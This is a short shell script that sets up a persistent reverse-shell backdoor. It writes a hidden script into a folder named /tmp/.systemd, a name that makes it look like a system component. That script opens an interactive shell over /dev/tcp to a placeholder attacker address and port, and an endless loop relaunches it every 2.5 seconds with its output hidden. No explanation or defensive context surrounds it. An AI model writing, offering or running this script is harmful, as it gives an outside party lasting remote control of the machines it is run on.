#!/bin/sh
_addr=IP_ADDRESS
_port=PORT

_private='/tmp/.systemd'
mkdir -m 750 -p $_private
cat << END > $_private/.rev
#!/bin/sh
sh -i >& /dev/tcp/$_addr/$_port 0>&1
END

while true; do
    sh $_private/.rev &>/dev/null
    sleep 2.5s
done